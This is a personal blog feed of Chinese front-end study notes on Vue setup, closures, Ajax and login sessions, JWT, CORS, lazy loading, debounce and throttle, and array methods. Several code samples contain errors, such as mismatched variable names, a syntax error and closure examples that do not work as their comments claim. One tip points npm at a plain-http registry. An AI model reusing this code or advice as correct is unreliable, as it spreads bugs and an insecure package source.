punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"007"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"did not get the object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> result <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>firstName<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> storge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue踩坑合集</title>
      <link href="/2018/09/12/vue-cai-keng-he-ji/"/>
      <url>/2018/09/12/vue-cai-keng-he-ji/</url>
      
        <content type="html"><![CDATA[<h4 id="配置篇"><a href="#配置篇" class="headerlink" title="配置篇"></a>配置篇</h4><ol><li><p>对ES6/7语法的支持<br>ES6模块的动态加载是我们经常用到的。在项目中，我们经常看到的一个报错就是<code>Unexpexted token import</code>，我们要注意<code>import</code>和<code>export</code>是ES6的新特性。通常的解决方法是引入<code>babel-polyfill</code>依赖包。这个包的作用是啥？看官网上是怎么说的：</p><blockquote><p>This will emulate a full ES2015+ environment and is intended to be used in an application rather than a library/tool. This polyfill is automatically loaded when using babel-node.<br>This means you can use new built-ins like Promise or WeakMap, static methods like Array.from or Object.assign, instance methods like Array.prototype.includes, and generator functions (provided you use the regenerator plugin). The polyfill adds to the global scope as well as native prototypes like String in order to do this.   </p></blockquote><p>也就是说, 使用这个包可以将ES6语法重新编译，仿真ES5开发环境。如果我们在IE浏览器进行本地测试，控制台可能会提示我们使用polyfill兼容浏览器。在Vue服务器渲染环境下，我们可以在入口文件（index.js）引入全局：  </p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'babel-core/register'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'babel-polyfill'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./server.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//实际入口文件</span></code></pre></li><li><p>上面的操作可能会引入新的问题，<code>Error: Plugin/Preset files are not allowed to export objects, only functions.</code> 这个出现的原因可能是我们引入的<code>babel</code>包和原来项目中的<code>babel-loader</code>冲突。有两个解决方案，一个降级到6， 一个升级到7。配置如下：  </p><pre class=" language-json"><code class="language-json">//<span class="token number">1</span>. 降级<span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"babel-core"</span><span class="token operator">:</span> <span class="token string">"^6.26.3"</span><span class="token punctuation">,</span><span class="token property">"babel-eslint"</span><span class="token operator">:</span> <span class="token string">"^8.2.1"</span><span class="token punctuation">,</span><span class="token property">"babel-polyfill"</span><span class="token operator">:</span> <span class="token string">"^6.26.0"</span><span class="token punctuation">,</span><span class="token property">"babel-preset-es2015"</span><span class="token operator">:</span> <span class="token string">"^6.24.1"</span><span class="token punctuation">,</span><span class="token property">"babel-loader"</span><span class="token operator">:</span> <span class="token string">"^7.0.0"</span><span class="token punctuation">}</span>//<span class="token number">2</span>. 升级<span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@babel/core"</span><span class="token operator">:</span> <span class="token string">"^7.1.2"</span><span class="token punctuation">,</span><span class="token property">"@babel/polyfill"</span><span class="token operator">:</span> <span class="token string">"^7.0.0"</span><span class="token punctuation">,</span><span class="token property">"@babel/preset-env"</span><span class="token operator">:</span> <span class="token string">"^7.1.0"</span><span class="token punctuation">,</span><span class="token property">"@babel/register"</span><span class="token operator">:</span> <span class="token string">"^7.0.0"</span><span class="token punctuation">}</span></code></pre></li><li>安装一些包有可能报错：<code>npm ERR! network &#39;proxy&#39; config is set properly.  See: &#39;npm help config&#39;</code> 这时只要修改下node配置即可：<br><code>npm config set registry http://registry.cnpmjs.org/</code></li></ol><h4 id="用户交互篇"><a href="#用户交互篇" class="headerlink" title="用户交互篇"></a>用户交互篇</h4><ul><li>阻止事件冒泡：事件修饰符 .prevent / stop</li><li>对象引用问题：<ul><li>如果多个组件引用了同一个对象作为数据，那么当其中一个组件改动对象数据时，其他对象的数据也会同步改动；如果要避免同步依赖，可以通过深拷贝JSON.parse(JSON.stringify())</li><li>在Vue中如果数据是数组，Vue提供了数组操作的变异方法pop,push等，可以触发视图更新</li><li>向响应式对象中添加一个属性，并确保这个新属性同样是响应式的，且触发视图更新，我们可以使用Vue.set(target, key, value)</li></ul></li></ul><h4 id="数据库篇"><a href="#数据库篇" class="headerlink" title="数据库篇"></a>数据库篇</h4>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闭包的理解</title>
      <link href="/2018/09/12/bi-bao-de-li-jie/"/>
      <url>/2018/09/12/bi-bao-de-li-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="闭包的理解"><a href="#闭包的理解" class="headerlink" title="闭包的理解"></a>闭包的理解</h4><ul><li><strong>闭包</strong> 是指有权访问另一个函数作用域中变量的函数。创建闭包最常见的方式就是在一个函数的内部创建另一个函数，通过另一个函数访问这个函数的局部变量</li><li>利用闭包可以突破作用域链，将函数内部的变量和方法传递到外部</li><li>作用域链的理解：当某个函数被调用时，会创建一个执行环境及相应的作用域链，然后使用arguments和其他命名参数的值来初始化函数的活动对象；在作用域链中外部函数始终处于次一级，直到作用为作用域终点的全局执行环境。在函数执行过程中，为读取和写入变量的值，就需要在作用域链中查找变量</li><li>原理：当在函数内部定义个其他函数，就创建了闭包。闭包有权访问函数内部的所有变量。在后台执行环境中，闭包的作用域链包含着它自己的作用域、包含函数的作用域和全局作用域；当函数返回闭包时，这个函数的作用域会一直在内存中保存到闭包不存在为止；<h4 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h4></li><li>函数内再嵌套函数</li><li>内部函数可以引用外层的参数和变量</li><li>参数和变量不会被垃圾回收机制回收</li></ul><h4 id="闭包与变量"><a href="#闭包与变量" class="headerlink" title="闭包与变量"></a>闭包与变量</h4><ul><li>注意：闭包只能取得函数中任何变量的最后一个值<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//10,10,10,10,10</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//强制使用一个匿名函数，按值传递参数</span><span class="token keyword">function</span> <span class="token function">createFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> num<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0,1,2,3,4</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="this对象"><a href="#this对象" class="headerlink" title="this对象"></a>this对象</h4></li><li>this对象是在运行时基于函数的执行环境绑定的：在全局函数中，this等于window，而当函数被作为某个对象的方法调用时，this等于那个对象</li><li>匿名函数的执行环境具有全局性，其this对象通常指向window</li></ul><h4 id="模仿块级作用域"><a href="#模仿块级作用域" class="headerlink" title="模仿块级作用域"></a>模仿块级作用域</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">outputNumbers</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="私有变量"><a href="#私有变量" class="headerlink" title="私有变量"></a>私有变量</h4><ul><li>我们把有权访问私有变量和私有函数的公有方法称为特权方法；有两种在对象上创建特权方法的方式，第一种是在构造函数中定义特权方法；第二种是在私有作用域中定义私有变量或函数；</li><li>example 1<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> MyObject <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> privateVariable <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">privateFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>publicMethod <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    privateVariable<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">privateFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>example 2<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> privateFunction <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">privateFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  MyObject <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  MyObject<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>publicMethod <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    privateVariable<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">privateFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="模块模式"><a href="#模块模式" class="headerlink" title="模块模式"></a>模块模式</h4></li><li>单例指的是只有一个实例的对象，javascript是以对象字面量的方式来创建单例对象的</li><li>如果创建一个对象并以某些数据对其初始化，同时还要公开一些能够访问这些私有数据的方法，那么就可以使用模块模式</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ul><li>在函数内部创建一个调用外部变量的函数<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createComparisonFunction</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>object1<span class="token punctuation">,</span> object2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> value1 <span class="token operator">=</span> object1<span class="token punctuation">[</span>propertyName<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> value2 <span class="token operator">=</span> object2<span class="token punctuation">[</span>propertyName<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>value1 <span class="token operator">&lt;</span> value2<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>value1 <span class="token operator">></span> value2<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闭包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>登录方法总结</title>
      <link href="/2018/09/08/deng-lu-yan-zheng-fang-fa-zong-jie/"/>
      <url>/2018/09/08/deng-lu-yan-zheng-fang-fa-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://juejin.im/post/5b06c6baf265da0db4791805#comment" target="_blank" rel="noopener">Express+JWT最轻实践</a><br><a href="https://mp.weixin.qq.com/s/Vkshf-nEDwo2ODUJhxgzVA" target="_blank" rel="noopener">JS的防抖与节流</a></p><p>一、Ajax（Asynchronous JavaScript and XML）</p><ul><li>优点：无刷新更新数据，减少用户等待事件；<br>Ajax使用异步方式与服务器通信，不需要打断用户的操作，减少不必要的数据传输、时间及降低网络上的数据流量；<br>界面呈现与应用数据分离；</li><li>缺点：后退与书签收藏功能；解决：1. HTML5创建一个隐藏的iframe来跟踪历史记录，重现页面上的变化；</li></ul><ol start="2"><li>使用URL片段标识符(#)来保持追踪;接口暴露，跨站点脚本攻击、SQL注入攻击、基于Credentials的安全漏洞；  </li></ol><p>二、 XMLHttpRequest</p><ol><li>4个阶段：0： 初始化状态，对象创建或者abort()重置；1： open调用； 2： send调用； 3. receiving：响应头部接收； 4. loaded: http响应完全接收</li><li>setRequestHeader()</li><li><p>手写Ajax</p><pre><code>var ajax = {} ;ajax.httpRequest = function () { if(window.XMLHttpRequest) {     return new XMLHttpRequest(); } var version = [&quot;MSXML2.XmlHttp.6.0&quot;, &quot;MSXML2.XmlHttp.5.0&quot;, &quot;MSXML2.XmlHttp.4.0&quot;,&quot;MSXML2.XmlHttp.3.0&quot;, &quot;MSXML2.XmlHttp.2.0&quot;, &quot;MSXML2.XmlHttp&quot;] var xhr; for(var i = 0; i &lt; versions.length; i++) {     try {         xhr = new ActiveXObject(versions[i]);         break;     } catch (e) {     } } return xhr;}</code></pre><pre><code>ajax.send = function(url, callback, method, data, async) { //默认异步 if(async == undefined) { async = true; } var httpRequest = ajax.httpRequest(); httpRequest.open(method, urlm async); httpRequest.onreadystatechange = function() {     if(httpRequest.readyState == 4) {         callback(httpRequest.responseText)     } }; if(method == &#39;POST&#39;) {     httpRequest.setRequestHeader(&#39;Content-type&#39;, &#39;application/x-www-form-urlencoded&#39;); } httpRequest.send(data);};</code></pre><pre><code>ajax.get = function(url, data, callback, async) { var query = []; for(var key in data) {     query.push(encodeURIComponent(key) + &#39;=&#39; + encodeURIComponent(data[key])); } ajax.send(url + (query.length ? &#39;?&#39; + query.join(&#39;&amp;&#39;) : &#39;&#39;), callback, &#39;GET&#39;, null, async)}</code></pre><pre><code>ajax.post = function(url, data, callback, async) { var query = []; for(var key in data) {     query.push(encodeURIComponent(key) + &#39;=&#39; + encodeURIComponent(data[key])); } ajax.send(url, callback, &#39;POST&#39;, query.join(&#39;&amp;&#39;), async);}</code></pre></li></ol><p>默认 async = true -&gt; 异步<br>默认 async = false -&gt; 同步</p><pre><code>console.log(1);$.ajax({    url: &quot;&quot;,    async: false,    success: function() {        console.log(2);    }});console.log(3);</code></pre><p>三、 Axios</p><ul><li>使用<pre><code>axios({  method: &#39;get&#39;,  url: &#39;http://example.com/test&#39;,  responseType: &#39;stream&#39;}).then(function(response){  response.data.pipe(fs.createWriteStream(&#39;example_img.jpg&#39;))}).catch(e) {  console.log(e);}</code></pre></li><li>手写文件上传<pre><code>&lt;form role=&quot;form&quot; onsubmit=&quot;return false&quot;&gt;  &lt;div class=&quot;form-group&quot;&gt;      &lt;label for=&quot;file&quot;&gt;File&lt;/label&gt;      &lt;input id=&quot;file&quot; type=&quot;file&quot; class=&quot;from-control&quot;&gt;&lt;/input&gt;  &lt;/div&gt;  &lt;button id=&quot;updload&quot; type=&quot;button&quot;&gt;Update&lt;/button&gt;&lt;/form&gt;&lt;script&gt;  (function(){      var output = document.getElementById(&#39;output&#39;);      document.getElementById(&#39;upload&#39;).onclick = function() {          var data = new FormData();          data.append(&#39;foo&#39;, &#39;bar&#39;);          data.append(&#39;file&#39;,document.getElementById(&#39;file&#39;).files[0]);          var config = {              onUploadProgress: function(processEvent) {                  var percentCompleted = Math.round((processEvent.load * 100 ) / processEvent.total);              }          };          axios.put(&#39;/updload/server&#39;, data, config)              .then(function(res){                  output.className = &#39;container&#39;;                  output.innerHTML = res.data;                  })      }  })();&lt;/script&gt;</code></pre></li></ul><p>四、 session-cookie实现登录</p><ul><li>session是用来在客户端与服务器之间保持状态的解决方案，在服务器端可以存储在文本文件或者redis;session有生命周期；存储特定用户会话所需的属性及配置信息。  </li><li>我们通过用户名和密码提交表单，通过api提交服务器之后，首先检查请求头没有携带cookie，有的话就检查cookie中有没有携带session_id字段值是否存在数据库或者文本文件，更新过期时间；</li><li>没有的话就重新生成一个session_id，可以通过时间戳再加密生成，在res的响应头部设置Set-Cookie在客户端创建一个cookie(name=value, 域domain, 路径path; 失效时间expires/max-age; 日期格式； secure:只能发送给https; HttpOnly)</li><li>express-session的中间件： 直接初始化的时候设置了存储的数据库，还用用来加密的字段，用的时候，就直接调用req.session req.session.regenerate req.session.destroy</li></ul><pre><code>var sessions = {};var key = &#39;session_id&#39;;var EXPIRES = 20*60*1000;var generate  = function () {    var session = {};    session.id = (new Date().getTime()) + Math.random();    session.cookie = {        expire: (new Date()).getTime() + EXPIRES    }    sessions[session.id] = session}function (req, res) {    var id = req.cookies[key];    if (!id) {        req.session = generate();    } else {        var session = sessions[id];        if (session) {            if (session.cookie.expire &gt; new Date().getTime()) {                session.cookie.expire = new Date().getTime() + EXPIRES;                req.session = session;            } else {                delete sessions[id];                req.session = generate();            }        } else {            req.session = generate();        }    }}</code></pre><p>五、express + token登录</p><ul><li>jwt: 头部(tpye, algorithmn)，有效载荷和签名</li><li>服务器不用存放token数据，用户验证后，服务器生成一个token(一般用hash或者encrypt)存在cookie中发给客户端，客户端每次请求在头部cookie带上token;</li><li>把头部和playload和我们提供的密钥进行编码连接生成签名</li><li>在vuex中，如果更新的话，通过commit更新token和authUser=user, nuxtServerInit 用户信息+服务端算法=》加密形成token； axios可以做一个请求拦截，给请求带上token. localStorage.getItem</li></ul><p>六、跨域</p><pre><code>proxyTable: {      &#39;/api&#39;: {        target: &#39;http://121.41.130.58:9090&#39;,//设置你调用的接口域名和端口号 别忘了加http        changeOrigin: true,        pathRewrite: {          &#39;^/api&#39;: &#39;&#39;//这里理解成用‘/api’代替target里面的地址，后面组件中我们掉接口时直接用api代替 比如我要调用&#39;http://40.00.100.100:3002/user/add&#39;，直接写‘/api/user/add’即可        }      }    }        axios.post(&#39;/api/yt_api/login/doLogin&#39;,postData)    .then(function (response) {        console.log(1)        console.log(response);    })    .catch(function (error) {        console.log(error);    })</code></pre><ul><li>CORS: axios设置请求头<ul><li>Origin: <code>http://www.example.com</code></li><li>服务器返回： Access-Control-Allow-Origin: <code>http://www.example.com</code></li></ul></li><li>JSONP<pre><code>var script = document.createElement(&#39;script&#39;);script.src = &quot;http://sss/?callback=handleResponse&quot;document.body.insertBefore(script, document.body.firstChild)</code></pre></li></ul><ul><li><p>网络安全</p><ul><li>CSRF(Cross-Site Request Forgery)跨站点请求伪造</li><li>SQL注入攻击 (查询字符串过滤)</li><li>文件上传攻击</li><li>XSS跨站脚本攻击</li><li>程序逻辑漏洞</li></ul></li><li><p>图片懒加载</p><ul><li>原因：因为那个影片查询页面，一个页面的图片很多，一次加载完很影响性能；</li><li>原理：页面中的img元素，如果没有src属性，浏览器就不会发出请求去下载图片，只有js设置了图片路径，浏览器才会发送请求；懒加载的原理就是先在页面中把所有图片统一使用一张占位图进行占位，把真正的路径存在“data-src”属性里；页面加载后，根据scrollTop判断图片是否在用户视野，在就将”data-src”的属性值取出存放到”src”属性；滚动事件中重复判断。<pre><code>function isVisible($node) {    var winH = $(window).height(),                                    //浏览器窗口高度        scrollTop = $(document).scrollTop(),                          //滚轮滚动高度        offSetTop = $node.offset().top;                               //元素距离浏览器顶部的距离    if (offSetTop &lt; winH + scrollTop) {        let src_value = $node.attr(&quot;data-src&quot;);        $node.attr(&quot;src&quot;, src_value);        console.log(&#39;loading img&#39;);        return true;    } else {        return false;    }}function loadPartImg() {    $(&quot;.pic&quot;).each(function () {        if ($(this).attr(&quot;src&quot;) != &quot;&quot;) {            return;        } else {            isVisible($(this));        }    });}loadPartImg();$(window).on(&quot;scroll&quot;, function () {    loadPartImg();});</code></pre></li></ul></li><li><p>防抖：函数防抖（debounce）：当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时。如下图，持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件。</p><pre><code>function debounce(fn, wait) {  var timeout = null;  return function() {      if(timeout !== null)              clearTimeout(timeout);      timeout = setTimeout(fn, wait);  }}// 处理函数function handle() {  console.log(Math.random());}// 滚动事件window.addEventListener(&#39;scroll&#39;, debounce(handle, 1000));</code></pre></li><li><p>节流：函数节流（throttle）：当持续触发事件时，保证一定时间段内只调用一次事件处理函数。</p><pre><code>var throttle = function(func, delay) {  var prev = Date.now();  return function() {      var context = this;      var args = arguments;      var now = Date.now();      if (now - prev &gt;= delay) {          func.apply(context, args);          prev = Date.now();      }  }}function handle() {  console.log(Math.random());}window.addEventListener(&#39;scroll&#39;, throttle(handle, 1000));</code></pre></li></ul><p>Vue原理复习</p><ol><li>一个Vue实例（一个ViewModel的实例）挂载到页面，编译模板+数据劫持<br><a href="https://cloud.tencent.com/developer/article/1164037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1164037</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSript数组详解</title>
      <link href="/2018/09/03/javascript-shu-zu-xiang-jie/"/>
      <url>/2018/09/03/javascript-shu-zu-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h4><ul><li>构造函数<ul><li><code>var arr = new Array();</code></li><li>已知长度：<code>var arr = new Array(20);</code></li><li>传入值：<code>var arr = new Array(&quot;red&quot;, &quot;yellow&quot;, &quot;green&quot;);</code></li></ul></li><li>数组字面量<ul><li><code>var arr = [];</code></li><li><code>var arr = [&quot;red&quot;, &quot;yellow&quot;, &quot;green&quot;];</code></li></ul></li></ul><h4 id="数组检测"><a href="#数组检测" class="headerlink" title="数组检测"></a>数组检测</h4><ul><li><code>arr instanceof Array</code></li><li>更通用的：<code>Array.isArray(arr)</code></li></ul><h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><ul><li><code>valueOf()</code>：返回本身</li><li><code>toString()</code>：返回由数组中每个值的字符串形式拼接而来的一个以逗号分隔的字符串</li><li><code>toLocaleString()</code>：调用每一项的toLocaleString()方法</li></ul><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">参数</th><th style="text-align:left">返回值</th></tr></thead><tbody><tr><td style="text-align:left">push</td><td style="text-align:left">任意数量的参数</td><td style="text-align:left">添加到数组尾部，返回修改后数组长度</td></tr><tr><td style="text-align:left">pop</td><td style="text-align:left">无</td><td style="text-align:left">移除最后一项，返回最后一项的值</td></tr><tr><td style="text-align:left">shift</td><td style="text-align:left">无</td><td style="text-align:left">移除第一项并返回该值</td></tr><tr><td style="text-align:left">unshift</td><td style="text-align:left">任意数量的参数</td><td style="text-align:left">添加到数组头部，返回修改后数组长度</td></tr><tr><td style="text-align:left">reverse</td><td style="text-align:left">无</td><td style="text-align:left">反转数组，数组本身值改变，返回反转后的数组</td></tr><tr><td style="text-align:left">sort</td><td style="text-align:left">可选，自定义比较函数</td><td style="text-align:left">数组本身值改变，返回排序后的数组，默认升序</td></tr><tr><td style="text-align:left">concat</td><td style="text-align:left">一个或者多个数组或者值</td><td style="text-align:left">不修改原数组，返回新数组</td></tr><tr><td style="text-align:left">slice</td><td style="text-align:left">一个或者两个参数，返回项的起始位置和结束位置</td><td style="text-align:left">返回起始和结束位置之间的项（不包括结束位置的项）</td></tr><tr><td style="text-align:left">indexOf</td><td style="text-align:left">要查找的项(可选的)表示从数组开头向后查找查找起点位置的索引</td><td style="text-align:left">返回查找项的索引，，没有返回-1</td></tr><tr><td style="text-align:left">lastIndexOf</td><td style="text-align:left">要查找的项(可选的)表示从数组末尾向前查找的起点位置的索引</td><td style="text-align:left">返回查找项的索引，，没有返回-1</td></tr></tbody></table><ul><li><strong>splice()</strong>：<ul><li>删除：2个参数，要删除的第一项的位置和要删除的项数</li><li>插入：3个参数，起始位置、0（要删除的项数）、要插入的项（可以多个）</li><li>替换：3个参数，起始位置、要删除的项数、要插入的任意数量的项</li></ul></li></ul><h4 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h4><ul><li><strong>every()</strong>：如果每一项都返回<code>true</code>则返回<code>true</code></li><li><strong>filter()</strong>：返回该函数会返回<code>true</code>的项组成的数组</li><li><strong>forEach()</strong>：对每一项执行给定函数，没有返回值</li><li><strong>map()</strong>：对每一项执行给定函数，返回每次函数调用结果组成的数组</li><li><strong>some()</strong>：如果任一项都返回<code>true</code>则返回<code>true</code></li></ul><h4 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h4><ul><li>迭代数组所有项，返回一个最终值</li><li><strong>reduce()</strong>：从数组第一项开始逐个遍历到最后</li><li><strong>reduceRight()</strong>：从数组最后一项开始逐个遍历到第一项</li><li>执行函数的4个参数：前一个值、当前值、项的索引、数组对象</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> Array </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise异步编程</title>
      <link href="/2018/08/30/promise-yi-bu-bian-cheng/"/>
      <url>/2018/08/30/promise-yi-bu-bian-cheng/</url>
      
